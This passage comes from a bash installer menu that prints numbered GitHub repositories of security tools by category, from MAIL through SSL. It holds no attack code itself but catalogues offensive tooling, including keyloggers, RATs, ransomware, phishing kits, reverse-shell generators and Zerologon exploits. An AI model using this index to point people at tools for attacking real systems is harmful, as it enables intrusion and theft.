		Stampa " 1432. D35m0nd142/LFISuite" "1440. mzfr/liffy"
		echo "$SEP"
	fi
	echo "$CDR"" DR. LTE"
	if [[ "$CDR" == "[-]" ]];
	then
		Stampa " 1464. Evrytania/LTE-Cell-Scanner"
		echo "$SEP"
	fi
	echo "$CDS"" DS. MACRO"
	if [[ "$CDS" == "[-]" ]];
	then
		Stampa " 1468. infosecn1nja/MaliciousMacroMSBuild"
		echo "$SEP"
	fi
	echo "$CDT"" DT. MAGENTO"
	if [[ "$CDT" == "[-]" ]];
	then
		Stampa " 1471. steverobbins/magescan"
		echo "$SEP"
	fi
	echo "$CDU"" DU. MAIL"
	if [[ "$CDU" == "[-]" ]];
	then
		Stampa " 1262. khast3x/h8mail"
		echo "$SEP"
	fi
	echo "$CDV"" DV. MALWARE"
	if [[ "$CDV" == "[-]" ]];
	then
		Stampa " 407. avinashkranjan/Malware-with-Backdoor-and-Keylogger"
		Stampa " 2567. 0xFreddox/KeyLogger-WebService" "2596. Revise7/ViperVenom" "1478. technoskald/maltrieve"
		echo "$SEP"
	fi
	echo "$CDW"" DW. MEMCACHEDAEMON"
	if [[ "$CDW" == "[-]" ]];
	then
		Stampa " 166. linsomniac/python-memcached"
		echo "$SEP"
	fi
	echo "$CDX"" DX. MISC - FRAMEWORKS"
	if [[ "$CDX" == "[-]" ]];
	then
		Stampa " 20. trustedsec scripts" "21. Hood3dRob1n scripts" "33. fox-it/BloodHound"
		Stampa " 67. byt3bl33d3r/CrackMapExec" "52. tismayil/ohmybackup" "40. SecureAuthCorp/impacket"
		Stampa " 141. pry0cc/axiom" "7. dark-warlord14/ffufplus" "45. porterhau5/BloodHound-Owned"
		Stampa " 90. jivoi/pentest/tools" "186. Manisso/fsociety" "228. koutto/jok3r"
		Stampa " 244. s0md3v/Striker" "253. b3-v3r/Hunner" "254. PowerScript/KatanaFramework"
		Stampa " 255. unkn0wnh4ckr/hackers-tool-kit" "256. santatic/web2attack" "257. andyvaikunth/roxysploit"
		Stampa " 258. x3omdax/PenBox" "259. dhondta/dronesploit" "282. m4n3dw0lf/pythem"
		Stampa " 284. brutemap-dev/brutemap" "288. dark-lbp/isf" "289. onccgroup/redsnarf"
		Stampa " 296. Z4nzu/hackingtool" "304. GitHackTools/BruteDum/brutedum" "1080. ucsb-seclab/dr_checker"
		Stampa " 310. future-architect/vuls" "311. ethicalhackerproject/TaiPan" "319. marcrowProject/Bramble"
		Stampa " 320. stevemcilwain/quiver" "322. abdulr7mann/hackerEnv" "2391. ztgrace/mole"
		Stampa " 392. zerosum0x0/koadic" "403. Screetsec/TheFatRat" "2250. its-a-feature/Mythic"
		Stampa " 408. AdrianVollmer/PowerHub" "439. DarkSecDevelopers/HiddenEye" "481. 0xInfection/TIDoS-Framework"
		Stampa " 485. r3dxpl0it/TheXFramework" "488. Taguar258/Raven-Storm" "514. maxlandon/wiregost"
		Stampa " 523. nerodtm/ReconCobra---Complete-Automated-Pentest-Framework-For-Information-Gatheringt"
		Stampa " 527. Moham3dRiahi/XAttacker" "529. riusksk/StrutScan" "530. AlisamTechnology/ATSCAN"
		Stampa " 554. FluxionNetwork/fluxion" "557. knassar702/scant3r" "567. Leviathan36/kaboom"
		Stampa " 568. archerysec/archerysec" "579. AnonymousAt3/cybermap" "604. qsecure-labs/overlord"
		Stampa " 606. Chudry/Xerror" "616. rajkumardusad/Tool-X" "626. GoVanguard/legion"
		Stampa " 640. KALILINUXTRICKSYT/easysploit" "650. edoardottt/scilla" "742. rajkumardusad/onex"
		Stampa " 761. toniblyx/prowler" "766. helich0pper/Karkinos" "770. jaeles-project/jaeles"
		Stampa " 775. aaaguirrep/offensive-docker" "818. dpnishant/appmon" "842. m4ll0k/AutoNSE"
		Stampa " 843. nccgroup/autopwn" "863. ThunderGunExpress/BADministration" "1597. D4Vinci/One-Lin3r"
		Stampa " 888. sensepost/birp" "890. sepehrdaddev/blackbox" "900. darryllane/Bluto"
		Stampa " 2243. CoolHandSquid/TireFire" "907. zcutlip/bowcaster" "909. gabemarshall/Brosec"
		Stampa " 951. MITRECND/chopshop" "974. hatRiot/clusterd" "494. optiv/ScareCrow"
		Stampa " 993. Hack-Hut/CrabStick" "1015. medbenali/CyberScan" "1022. M4cs/DarkSpiritz"
		Stampa " 2288. thehackingsage/hacktronian" "2295. beefproject/beef" "1049. DidierStevens/DidierStevensSuite"
		Stampa " 1079. maxousc59/Blue-Sky-Information-Security" "1074. AeonDave/doork" "1082. screetsec/Dracnmap"
		Stampa " 1119. BC-SECURITY/Empire" "2299. dr-3am/M-Evil" "2317. mdsecactivebreach/SharpShooter"
		Stampa " 2327. spicesouls/spicescript" "2328. spicesouls/spicescript2" "2329. CMEPW/Smersh"
		Stampa " 2342. guardicore/monkey" "2347. sidaf/homebrew-pentest" "2364. 1N3/BlackWidow"
		Stampa " 2365. mikesplain/openvas-docker" "2377. programmingAthlete/BruteSniffing_Fisher"
		Stampa " 2381. andrew-d/static-binaries/linux/x86_64" "2382. andrew-d/static-binaries/linux/x86"
		Stampa " 2383. andrew-d/static-binaries/linux/arm" "2400. r3curs1v3-pr0xy/vajra" "1125. gteissier/erl-matter"
		Stampa " 2445. ra1nb0rn/avain" "1162. chrispetrou/FDsploit" "1184. thewhiteh4t/flashsploit"
		Stampa " 1174. 1N3/findsploit" "1195. AndroidTamer/frida-push" "1228. OWASP/glue"
		Stampa " 1233. golismero/golismero" "1234. anarcoder/google_explorer" "1236. 1N3/Goohak"
		Stampa " 2474. bahaabdelwahed/killshot" "1263. portantier/habu" "1267. 4shadoww/hakkuframework"
		Stampa " 2514. P1kachu/v0lt" "651. leebaird/discover" "2550. s1l3nt78/sifter"
		Stampa " 1296. dstotijn/hetty" "2588. aufzayed/HydraRecon" "2592. Malam-X/DragonMS"
		Stampa " 2605. FunnyWolf/Viper" "2617. hpthreatresearch/subcrawl" "1428. leviathan-framework/leviathan"
		Stampa " 2620. AsjadOooO/Zero-attacker" "1460. api0cradle/LOLBAS" "1465. lateralblast/lunar"
		Stampa " 1484. 1N3/Sn1per"
		echo "$SEP"
	fi
	echo "$CDY"" DY. MITM - SNIFFING"
	if [[ "$CDY" == "[-]" ]];
	then
		Stampa " 249. kgretzky/evilginx2" "331. mkdirlove/SSLSTRIP-NG/sslstrip-ng" "541. wifiphisher/wifiphisher"
		Stampa " 764. Esser420/EvilTwinFramework" "801. Josue87/Airopy" "872. secretsquirrel/BDFProxy"
		Stampa " 2240. kpcyrd/sniffglue" "934. MobSF/CapFuzz" "2245. kismetwireless/kismet"
		Stampa " 999. codepr/creak" "38. secdev/scapy" "1126. DoubleThreatSecurity/Espionage"
		Stampa " 1109. s0lst1c3/eaphammer" "2384. SpiderLabs/Responder" "359. lgandx/Responder"
		Stampa " 2385. hausec/ProxyLogon" "2435. eslam3kl/PackSniff" "1126. DoubleThreatSecurity/Espionage"
		Stampa " 1130. bitbrute/evillimiter" "1133. Exa-Networks/exabgp" "1153. Crypt0s/FakeDns"
		Stampa " 1154. fireeye/flare-fakenet-ng" "1185. 7h3rAm/flowinspect" "1204. michaeltelford/gatecrasher"
		Stampa " 1266. haka-security/haka" "1277. staz0t/hashcatch" "1288. ZerBea/hcxdumptool"
		Stampa " 1292. ApertureLabsLtd/hdmi-sniff" "1305. xme/hoover" "1308. schollz/howmanypeoplearearound"
		Stampa " 1322. nbuechler/hungry-interceptor" "1325. xiam/hyperfox" "1364. juphoff/issniff"
		Stampa " 1386. rixed/junkie" "1416. DanMcInerney/LANs.py" "1479. sensepost/mana"
		Stampa " 1510. blackeko/mitm" "1511. jrmdev/mitm_relay" "1512. dirkjanm/mitm6"
		Stampa " 1513. xdavidhu/mitmAP" "1514. husam212/MITMer" "1515. byt3bl33d3r/MITMf"
		Stampa " 1517. arkime/arkime" "1555. DanMcInerney/net-creds" "1558. NytroRST/NetRipper"
		echo "$SEP"
	fi
	echo "$CDZ"" DZ. MOBILE"
	if [[ "$CDZ" == "[-]" ]];
	then
		Stampa " 2344. sensepost/objection" "2593. tegal1337/CiLocks"
		echo "$SEP"
	fi
	echo "$CEA"" EA. MODEM"
	if [[ "$CEA" == "[-]" ]];
	then
		Stampa " 1509. kamalmostafa/minimodem"
		echo "$SEP"
	fi
	echo "$CEB"" EB. MONGODB - NOSQL"
	if [[ "$CEB" == "[-]" ]];
	then
		Stampa " 230. youngyangyang04/NoSQLAttack" "231. codingo/NoSQLMap" "232. torque59/Nosql-Exploitation-Framework"
		Stampa " 1518. stampery/mongoaudit"
		echo "$SEP"
	fi
	echo "$CEC"" EC. MRT"
	if [[ "$CEC" == "[-]" ]];
	then
		Stampa " 1529. t2mune/mrtparse"
		echo "$SEP"
	fi
	echo "$CED"" ED. MYSQL"
	if [[ "$CED" == "[-]" ]];
	then
		Stampa " 301. ufuksungu/MySqlBruteForce/mysql"
		echo "$SEP"
	fi
	echo "$CHR"" HR. N1QL"
	if [[ "$CHR" == "[-]" ]];
	then
		Stampa " 1545. FSecureLABS/N1QLMap"
		echo "$SEP"
	fi
	echo "$CEE"" EE. NAS"
	if [[ "$CEE" == "[-]" ]];
	then
		Stampa " 402. TrustMe00/experience_synology_attack" "1547. tcstool/nasnum"
		echo "$SEP"
	fi
	echo "$CHS"" HS. NETBIOS"
	if [[ "$CHS" == "[-]" ]];
	then
		Stampa " 1548. resurrecting-open-source-projects/nbtscan"
		echo "$SEP"
	fi
	echo "$CEF"" EF. NETLOGON"
	if [[ "$CEF" == "[-]" ]];
	then
		Stampa " 508. risksense/zerologon" "509. bb00/zer0dump" "510. VoidSec/CVE-2020-1472"
		echo "$SEP"
	fi
	echo "$CEG"" EG. NETWORK - TCP - UDP - 802.x"
	if [[ "$CEG" == "[-]" ]];
	then
		Stampa " 2504. tomac/yersinia" "1527. CiscoCXSecurity/mptcp-abuse" "1543. mehrdadrad/mylg"
		Stampa " 1546. carmaa/nacker" "1553. troglobit/nemesis" "1559. walchko/netscan2"
		echo "$SEP"
	fi
	echo "$CEH"" EH. NGINX"
	if [[ "$CEH" == "[-]" ]];
	then
		Stampa " 2461. stark0de/nginxpwner"
		echo "$SEP"
	fi
	echo "$CEI"" EI. NSE"
	if [[ "$CEI" == "[-]" ]];
	then
		Stampa " 2635. Diverto/nse-log4shell" "2636. psc4re/NSE-scripts" "2637. hackertarget/nmap-nse-scripts"
		Stampa " 2638. hkm/nmap-nse-scripts" "2639. takeshixx/nmap-scripts" "2640. giterlizzi/nmap-log4shell"
		Stampa " 2641. 4ARMED/nmap-nse-scripts"
		echo "$SEP"
	fi
	echo "$CEJ"" EJ. NTP"
	if [[ "$CEJ" == "[-]" ]];
	then
		Stampa " 178. PentesterES/Delorean"
		echo "$SEP"
	fi
	echo "$CEK"" EK. OWA"
	if [[ "$CEK" == "[-]" ]];
	then
		Stampa " 343. busterb/msmailprobe" "344. 0xZDH/o365spray" "345. gremwell/o365enum"
		echo "$SEP"
	fi
	echo "$CEL"" EL. PASSWORD"
	if [[ "$CEL" == "[-]" ]];
	then
		Stampa " 393. clr2of8/DPAT"
		echo "$SEP"
	fi
	echo "$CEM"" EM. PAYLOAD"
	if [[ "$CEM" == "[-]" ]];
	then
		Stampa " 1270. Rich5/Harness" "1295. EgeBalci/HERCULES" "1343. 4w4k3/Insanity-Framework"
		Stampa " 2618. Deadpool2000/Paybag" "1412. sensepost/kwetza" "1530. g0tmi1k/mpc"
		echo "$SEP"
	fi
	echo "$CEN"" EN. PDF"
	if [[ "$CEN" == "[-]" ]];
	then
		Stampa " 46. thelinuxchoice/evilpdf" "47. robins/pdfcrack" "48. BroadbentT/PDF-CRACKER/pdf-cracker"
		Stampa " 2274. superzerosec/evilpdf" "1333. coderofsalvation/imagegrep-bash"
		echo "$SEP"
	fi
	echo "$CEO"" EO. PERSISTENCE"
	if [[ "$CEO" == "[-]" ]];
	then
		Stampa " 2393. swisskyrepo/PayloadsAllTheThings/Methodology_and_Resources/Linux_-_Persistence"
		echo "$SEP"
	fi
	echo "$CEP"" EP. PHISHING - SOCIAL ENGINEERING"
	if [[ "$CEP" == "[-]" ]];
	then
		Stampa " 385. blark/cli-phisher" "412. kurogai/nero-phishing-server" "413. KnightSec-Official/Phlexish"
		Stampa " 489. david3107/squatm3" "490. netevert/dnsmorph" "767. htr-tech/zphisher"
		Stampa " 771. xxhax-team/vk-phishing" "937. ring0lab/catphish" "983. htr-tech/nexphisher"
		Stampa " 2277. suljot/shellphish" "1004. ustayready/CredSniper" "2239. Pinperepette/Geotweet_GUI"
		Stampa " 2340. Pinperepette/GeoTweet" "2343. UndeadSec/EvilURL" "2460. ultrasecurity/Storm-Breaker"
		Stampa " 1239. gophish/gophish" "2524. tokyoneon/CredPhish/dns_server" "1294. ytisf/hemingway"
		Stampa " 2621. sky9262/phishEye"
		echo "$SEP"
	fi
	echo "$CEQ"" EQ. PHP"
	if [[ "$CEQ" == "[-]" ]];
	then
		Stampa " 2247. ecriminal/phpvuln" "2248. ZaleHack/phpexploit"
		echo "$SEP"
	fi
	echo "$CER"" ER. POST-EXPLOITATION"
	if [[ "$CER" == "[-]" ]];
	then
		Stampa " 2241. master-of-servers/mose"
		echo "$SEP"
	fi
	echo "$CES"" ES. POSTGRESQL"
	if [[ "$CES" == "[-]" ]];
	then
		Stampa " 303. KTN1990/PostgreSQL--Attack-on-default-password-AUTOEXPLOITING-/DB"
		echo "$SEP"
	fi
	echo "$CET"" ET. PRINTER"
	if [[ "$CET" == "[-]" ]];
	then
		Stampa " 639. RUB-NDS/PRET" "2603. BeetleChunks/SpoolSploit"
		echo "$SEP"
	fi
	echo "$CEU"" EU. PRIVESC"
	if [[ "$CEU" == "[-]" ]];
	then
		Stampa " 2394. swisskyrepo/PayloadsAllTheThings/Methodology_and_Resources/Linux-PrivilegeEscalation"
		echo "$SEP"
	fi
	echo "$CEV"" EV. PROXY - REVERSE PROXY"
	if [[ "$CEV" == "[-]" ]];
	then
		Stampa " 162. fozavci/viproy-VoIPkit" "610. audibleblink/doxycannon" "885. nccgroup/BinProxy"
		Stampa " 1058. StalkR/dns-reverse-proxy" "1059. maurotfilho/dns-spoof" "1060. d4rkcat/dnsbrute"
		Stampa " 1061. dmitescu/dnscobra" "1062. leonjza/dnsfilexfer" "2403. p3nt4/Invoke-SocksProxy/ReverseSocksProxyHandler"
		Stampa " 1475. justmao945/mallory" "1538. muraenateam/muraena"
		echo "$SEP"
	fi
	echo "$CEW"" EW. PRY"
	if [[ "$CEW" == "[-]" ]];
	then
		Stampa " 743. deivid-rodriguez/pry-byebug"
		echo "$SEP"
	fi
	echo "$CEX"" EX. PST"
	if [[ "$CEX" == "[-]" ]];
	then
		Stampa " 2269. righettod/pst-digger"
		echo "$SEP"
	fi
	echo "$CEY"" EY. QUERIES"
	if [[ "$CEY" == "[-]" ]];
	then
		Stampa " 2253. CompassSecurity/BloodHoundQueries"
		echo "$SEP"
	fi
	echo "$CEZ"" EZ. RABBITMQ"
	if [[ "$CEZ" == "[-]" ]];
	then
		Stampa " 989. QKaiser/cottontail"
		echo "$SEP"
	fi
	echo "$CFA"" FA. RADIO"
	if [[ "$CFA" == "[-]" ]];
	then
		Stampa " 1244. bistromath/gr-air-modes" "1245. ptrkrysik/gr-gsm" "1246. drmpeg/gr-paint"
		Stampa " 1265. mossmann/hackrf"
		echo "$SEP"
	fi
	echo "$CFB"" FB. RAINBOW TABLE - PLAINMASTERKEYS"
	if [[ "$CFB" == "[-]" ]];
	then
		Stampa " 260. clu8/RainbowTable" "261. zcdziura/leprechaun" "262. CyberKnight00/RainbowHash"
		Stampa " 263. dgleebits/Double-Rainbow" "264. jtesta/rainbowcrackalack" "265. sepehrdaddev/hashcobra"
		Stampa " 1289. ZerBea/hcxkeys"
		echo "$SEP"
	fi
	echo "$CFC"" FC. RANSOMWARE"
	if [[ "$CFC" == "[-]" ]];
	then
		Stampa "2497. leonv024/RAASNet"
		echo "$SEP"
	fi
	echo "$CFD"" FD. RAR"
	if [[ "$CFD" == "[-]" ]];
	then
		Stampa " 273. dunossauro/PyRarCrack/pyrarcrack"
		echo "$SEP"
	fi
	echo "$CFE"" FE. RASPBERRY"
	if [[ "$CFE" == "[-]" ]];
	then
		Stampa " 584. BusesCanFly/rpi-hunter"
		echo "$SEP"
	fi
	echo "$CFF"" FF. RAT"
	if [[ "$CFF" == "[-]" ]];
	then
		Stampa " 536. Pure-L0G1C/Loki" "2230. fadinglr/Parat" "2235. BenChaliah/Arbitrium-RAT"
		Stampa " 2330. FrenchCisco/RATel" "2359. khaleds-brain/Bella" "2375. nathanlopez/Stitch"
		echo "$SEP"
	fi
	echo "$CFG"" FG. RDP"
	if [[ "$CFG" == "[-]" ]];
	then
		Stampa " 86. ekultek/bluekeep" "328. citronneur/rdpy" "329. aerissecure/rdpy"
		Stampa " 330. fhirschmann/rdp" "452. Vulnerability-scanner/Lazy-RDP" "636. xFreed0m/RDPassSpray"
		Stampa " 637. Viralmaniar/Remote-Desktop-Caching"
		echo "$SEP"
	fi
	echo "$CFH"" FH. RECONIZING"
	if [[ "$CFH" == "[-]" ]];
	then
		Stampa " 131. leobeosab/sharingan" "94. samhaxr/recox" "129. sowdust/ffff"
		Stampa " 214. j3ssie/Osmedeus" "242. smicallef/spiderfoot" "308. yogeshojha/rengine"
		Stampa " 390. lanmaster53/recon-ng" "391. methos2016/recon-ng" "501. LukaSikic/subzy"
		Stampa " 556. skynet0x01/tugarecon" "594. r3vn/badKarma" "599. utkusen/urlhunter"
		Stampa " 601. UnaPibaGeek/ctfr" "607. thewhiteh4t/seeker" "732. gotr00t0day/spyhunt"
		Stampa " 768. capt-meelo/LazyRecon" "769. nahamsec/lazyrecon" "772. eslam3kl/3klCon"
		Stampa " 2228. drsigned/sigurlx" "820. michenriksen/aquatone" "836. superhedgy/AttackSurfaceMapper"
		Stampa " 844. Tib3rius/AutoRecon" "2236. six2dez/reconftw" "2244. yassineaboukir/Asnlookup"
		Stampa " 1877. projectdiscovery/shuffledns" "1983. projectdiscovery/subfinder" "922. sham00n/buster"
		Stampa " 2282. s0md3v/ReconDog" "998. Ganapati/Crawlic" "1024. upgoingstar/datasploit"
		Stampa " 1122. Gilks/enumerid" "2405. c0dejump/HawkScan" "2431. heilla/SecurityTesting"
		Stampa " 2433. eslam3kl/3klector" "2434. eslam3kl/Explorer" "1158. devanshbatham/FavFreak"
		Stampa " 2606. sumo2001/Trishul" "1306. gabamnml/hoper" "1307. SpiderLabs/HostHunter"
		Stampa " 473. woj-ciech/Kamerka-GUI" "1400. clirimemini/Keye" "1434. blindfuzzy/LHF"
		echo "$SEP"
	fi
	echo "$CFI"" FI. REDIS"
	if [[ "$CFI" == "[-]" ]];
	then
		Stampa " 759. Avinash-acid/Redis-Server-Exploit" "1264. Ridter/hackredis"
		echo "$SEP"
	fi
	echo "$CFJ"" FJ. REST"
	if [[ "$CFJ" == "[-]" ]];
	then
		Stampa " 832. flipkart-incubator/astra"
		echo "$SEP"
	fi
	echo "$CFK"" FK. REVERSING"
	if [[ "$CFK" == "[-]" ]];
	then
		Stampa " 361. yeggor/UEFI_RETool" "737. gotr00t0day/b1n4ryR3v3rs3" "866. programa-stic/barf-project"
		Stampa " 1124. thorkill/eresi" "2349. 4w4k3/rePy2exe" "2390. nodauf/Girsh"
		Stampa " 2408. mentebinaria/retoolkit" "1179. rampageX/firmware-mod-kit" "1193. OALabs/frida-extract"
		Stampa " 1210. hugsy/gef" "1336. WerWolv/ImHex" "1388. katjahahn/JWScan"
		echo "$SEP"
	fi
	echo "$CFL"" FL. REVSHELL"
	if [[ "$CFL" == "[-]" ]];
	then
		Stampa " 515. 3v4Si0N/HTTP-revshell" "2321. shelld3v/JSshell" "2372. 0dayCTF/reverse-shell-generator"
		Stampa " 2392. swisskyrepo/PayloadsAllTheThings/Methodology_and_Resources/Reverse_Shell_Cheatsheet"
		Stampa " 2447. octetsplicer/LAZYPARIAH" "2456. GetRektBoy724/MeterPwrShell" "2608. lawndoc/mediator"
		Stampa " 1328. inquisb/icmpsh"
		echo "$SEP"
	fi
	echo "$CFM"" FM. RMI"
	if [[ "$CFM" == "[-]" ]];
	then
		Stampa " 867. NickstaDB/BaRMIe"
		echo "$SEP"
	fi
	echo "$CFN"" FN. ROGUE ACCESS POINT"
	if [[ "$CFN" == "[-]" ]];
	then
		Stampa " 575. MS-WEB-BN/c41n"
		echo "$SEP"
	fi
	echo "$CFO"" FO. ROOTKIT"
	if [[ "$CFO" == "[-]" ]];
	then
		Stampa " 853. chokepoint/azazel"
		echo "$SEP"
	fi
	echo "$CFP"" FP. ROUTERS"
	if [[ "$CFP" == "[-]" ]];
	then
		Stampa " 145. threat9/routersploit" "2487. acecilia/OpenWRTInvasion" "1505. kost/mikrotik-npk"
		Stampa " 1533. kkonradpl/mtscan"
		echo "$SEP"
	fi
	echo "$CFQ"" FQ. RPC"
	if [[ "$CFQ" == "[-]" ]];
	then
		Stampa " 233. aress31/xmlrpc-bruteforcer" "313. s4vitar/rpcenum" "570. hegusung/RPCScan"
		echo "$SEP"
	fi
	echo "$CFR"" FR. RSA"
	if [[ "$CFR" == "[-]" ]];
	then
		Stampa " 57. Ganapati/RsaCtfTool" "69. zweisamkeit/RSHack" "79. pablocelayes/rsa-wiener-attack"
		echo "$SEP"
	fi
	echo "$CFS"" FS. S7"
	if [[ "$CFS" == "[-]" ]];
	then
		Stampa " 2358. klsecservices/s7scan" "2360. hslatman/awesome-industrial-control-system-security/s7-cracker"
		Stampa " 2361. hslatman/awesome-industrial-control-system-security/s7-brute-offline"
		echo "$SEP"
	fi
	echo "$CFT"" FT. SCANNING"
	if [[ "$CFT" == "[-]" ]];
	then
		Stampa " 188. GrrrDog/FlashAV" "191. m57/piescan" "192. projectdiscovery/naabu"
		Stampa " 193. ahervias77/portscanner" "206. lanjelot/patator" "208. gh0stwizard/p5-udp-scanner"
		Stampa " 210. liamg/furious" "211. anvie/port-scanner" "212. anrosent/portscan"
		Stampa " 235. shodansploit/shodansploit" "236. ninj4c0d3r/ShodanCli" "2246. souravbaghz/RadareEye"
		Stampa " 266. google/tsunami-security-scanner" "267. deepsecurity-pe/GoGhost" "279. aabeling/portscan"
		Stampa " 299. brandonskerritt/RustScan" "363. projectdiscovery/nuclei" "448. m0nad/HellRaiser"
		Stampa " 449. RustScan/RustScan" "450. IFGHou/wapiti" "454. MrSqar-Ye/BadMod"
		Stampa " 455. future-architect/vuls" "456. almandin/fuxploider" "457. Moham3dRiahi/XAttacker"
		Stampa " 458. s0md3v/Corsy" "459. skavngr/rapidscan" "460. s0md3v/Silver"
		Stampa " 534. TheNittam/RPOscanner" "538. smackerdodi/CVE-bruter" "546. tstillz/webshell-scan"
		Stampa " 547. jofpin/fuckshell" "548. followboy1999/webshell-scanner" "549. emposha/Shell-Detector"
		Stampa " 627. w-digital-scanner/w13scan" "641. m4ll0k/Konan" "741. PaytmLabs/nerve"
		Stampa " 835. AlisamTechnology/ATSCAN-V3.1" "871. lijiejie/bbscan" "873. invictus1306/beebug"
		Stampa " 927. auraltension/c5scan" "943. ztgrace/changeme" "1097. stamparm/DSXS"
		Stampa " 1092. stamparm/DSFS" "1094. stamparm/DSJS" "1095. stamparm/DSSS"
		Stampa " 2366. lengjibo/dedecmscan" "2426. sensepost/glypeahead" "2430. Checkmarx/kics"
		Stampa " 2367. k8gege/K8PortScan" "2368. k8gege/K8tools" "2369. xs25cn/scanPort"
		Stampa " 2436. eslam3kl/NetScanner" "1127. peterpt/eternal_scanner" "1136. NullHypothesis/exitmap"
		Stampa " 1167. sfan5/fi6s" "2499. v-byte-cpu/sx" "2527. kleiton0x00/ppmap"
		Stampa " 2541. avilum/portsscan" "2568. Abhay2342/Network-Scanner" "2569. xadhrit/d9scan"
		Stampa " 2607. idealeer/xmap" "2613. RedSection/jspanda" "1427. onthefrontline/LetMeFuckIt-Scanner"
		Stampa " 2623. michelin/ChopChop" "1485. robertdavidgraham/masscan" "1486. trevordavenport/MasscanAutomation"
		Stampa " 2647. MrLion7/Lmap" "1556. chrizator/netattack2"
		echo "$SEP"
	fi
	echo "$CFU"" FU. SHELL"
	if [[ "$CFU" == "[-]" ]];
	then
		Stampa " 70. sameera-madushan/Print-My-Shell" "71. flozz/p0wny-shell/shell" "87. rastating/slae"
		Stampa " 95. TBGSecurity/splunk_shells" "281. berkgoksel/SierraTwo" "295. wintrmvte/Shellab"
		Stampa " 348. brimstone/go-shellcode" "349. TheBinitGhimire/Web-Shells/smevk" "432. offensive-security/exploitdb/shellcodes/android"
		Stampa " 433. offensive-security/exploitdb/shellcodes/linux" "434. offensive-security/exploitdb/shellcodes/linux_x86-64"
		Stampa " 435. offensive-security/exploitdb/shellcodes/linux_x86"
		Stampa " 436. offensive-security/exploitdb/shellcodes/windows"
		Stampa " 437. offensive-security/exploitdb/shellcodes/windows_x86-64"
		Stampa " 438. offensive-security/exploitdb/shellcodes/windows_x86"
		Stampa " 654. Rover141/Shellter" "825. alexpark07/ARMSCGen" "136. b1tg/rust-windows-shellcode"
		Stampa " 2320. Den1al/JSShell" "2333. packetstormsecurity/aesshell" "2489. baktoft/yaps"
		Stampa " 2604. d4t4s3c/Shelly" "1380. s0md3v/JShell"
		echo "$SEP"
	fi
	echo "$CFV"" FV. SHELLSHOCK"
	if [[ "$CFV" == "[-]" ]];
	then
		Stampa " 2279. MrCl0wnLab/ShellShockHunter" "2280. DanMcInerney/shellshock-hunter"
		echo "$SEP"
	fi
	echo "$CFW"" FW. SIP"
	if [[ "$CFW" == "[-]" ]];
	then
		Stampa " 1363. halitalptekin/isip" "1528. meliht/mr.sip"
		echo "$SEP"
	fi
	echo "$CFX"" FX. SMB"
	if [[ "$CFX" == "[-]" ]];
	then
		Stampa " 68. m4ll0k/SMBrute" "58. mvelazc0/Invoke-SMBLogin/smblogin" "65. ShawnDEvans/smbmap"
		Stampa " 157. 0v3rride/Enum4LinuxPy" "8. ZecOps/CVE-2020-0796-RCE-POC" "91. NickSanzotta/smbShakedown"
		Stampa " 92. quickbreach/SMBetray" "93. aress31/smbaudit" "312. T-S-A/smbspider"
		Stampa " 333. CoreSecurity/impacket/smbserver" "578. CiscoCXSecurity/creddump7" "2249. deepsecurity-pe/GoGhost"
		Stampa " 2284. deepsecurity-pe/GoGhost_amd64" "2285. deepsecurity-pe/GoGhost" "1127. peterpt/eternal_scanner"
		Stampa " 2312. nccgroup/keimpx" "2332. portcullis/acccheck"
		echo "$SEP"
	fi
	echo "$CFY"" FY. SMS"
	if [[ "$CFY" == "[-]" ]];
	then
		Stampa " 388. sharyer/GSMEvil/SmsEvil"
		echo "$SEP"
	fi
	echo "$CFZ"" FZ. SMTP"
	if [[ "$CFZ" == "[-]" ]];
	then
		Stampa " 418. pentestmonkey/smtp-user-enum" "419. altjx/ipwn/iSMTP" "421. tango-j/SMTP-Open-Relay-Attack-Test-Tool"
		Stampa " 422. crazywifi/SMTP_Relay_Phisher" "423. NickSanzotta/smbShakedown" "424. balaganeshgbhackers/Emailspoofing"
		Stampa " 425. RobinMeis/MITMsmtp" "426. mikechabot/smtp-email-spoofer-py" "525. jetmore/swaks"
		Stampa " 2305. aron-tn/Smtp-cracker" "2553. mrlew1s/BrokenSMTP" "2596. DrPython3/MailRipV2"
		echo "$SEP"
	fi
	echo "$CGA"" GA. SNMP"
	if [[ "$CGA" == "[-]" ]];
	then
		Stampa " 74. hatlord/snmpwn" "75. etingof/pysnmp" "77. InteliSecureLabs/SNMPPLUX"
		Stampa " 78. cysboy/SnmpCrack" "710. LukasRypl/snmp-fuzzer" "957. nccgroup/cisco-snmp-enumeration"
		Stampa " 958. nccgroup/cisco-snmp-slap"
		echo "$SEP"
	fi
	echo "$CGB"" GB. SOCIAL MEDIA"
	if [[ "$CGB" == "[-]" ]];
	then
		Stampa " 427. yasserjanah/ZeS0MeBr" "551. Cyb0r9/SocialBox" "642. th3unkn0n/facebash-termux"
		echo "$SEP"
	fi
	echo "$CGC"" GC. SPOOFING"
	if [[ "$CGC" == "[-]" ]];
	then
		Stampa " 290. initstring/evil-ssdp" "291. KALILINUXTRICKSYT/easymacchanger" "292. sbdchd/macchanger"
		Stampa " 2438. eslam3kl/MAC_Changer" "2437. eslam3kl/ARP-Spoofer"
		echo "$SEP"
	fi
	echo "$CGD"" GD. SQL"
	if [[ "$CGD" == "[-]" ]];
	then
		Stampa " 159. ccpgames/sqlcmd" "160. sqlmapproject/sqlmap"
		Stampa " 161. payloadbox/sql-injection-payload-list" "347. kayak/pypika" "713. GDSSecurity/SQLBrute"
		echo "$SEP"
	fi
	echo "$CGE"" GE. SS7"
	if [[ "$CGA" == "[-]" ]];
	then
		Stampa " 384. ernw/ss7MAPer"
		echo "$SEP"
	fi
	echo "$CGF"" GF. SSH"
	if [[ "$CGF" == "[-]" ]];
	then
		Stampa " 59. R4stl1n/SSH-Brute-Forcer" "152. matricali/brutekrag" "153. c0r3dump3d/osueta"
		Stampa " 155. W-GOULD/ssh-user-enumeration/ssh-check-username" "156. nccgroup/ssh_user_enum/ssh_enum"
		Stampa " 297. OffXec/fastssh" "368. Neetx/sshdodge" "369. trustedsec/meterssh"
		Stampa " 370. norksec/torcrack" "372. aryanrtm/sshBrutal" "714. wireghoul/sploit-dev/sshfuzz"
		Stampa " 738. gotr00t0day/SSHbrute" "876. chokepoint/Beleth" "2472. EntySec/Shreder"
		Stampa " 2490. k4yt3x/orbitaldump"
		echo "$SEP"
	fi
	echo "$CGG"" GG. SSL"
	if [[ "$CGG" == "[-]" ]];
	then
		Stampa " 190. moxie0/sslstrip" "194. indutny/heartbleed" "195. roflcer/heartbleed-vuln/attack"
		Stampa " 298. rbsec/sslscan" "790. hahwul/a2sv" "954. mozilla/cipherscan"
		Stampa " 1293. robertdavidgraham/heartleech"
